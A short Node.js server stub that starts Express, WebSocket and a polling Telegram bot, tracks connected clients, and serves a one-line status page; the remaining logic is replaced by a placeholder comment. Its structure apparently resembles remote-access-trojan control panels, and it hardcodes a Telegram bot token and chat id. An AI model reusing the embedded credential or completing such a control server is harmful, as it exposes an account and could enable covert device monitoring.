
const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8134134550:AAGTFXSdGVe5r3seS6csTGulrAbTYTuAFwg'
const id = '7307374789'
const address = 'https://hianime.to/'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

// Remove existing webhook to avoid conflict
appBot.deleteWebhook().then(() => {
    console.log("Webhook removed. Polling mode should now work.");
}).catch(err => {
    console.error("Error deleting webhook:", err.message);
});

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

// The rest of your existing server logic here...

appServer.listen(3000, () => {
    console.log("Server is running on port 3000");
});
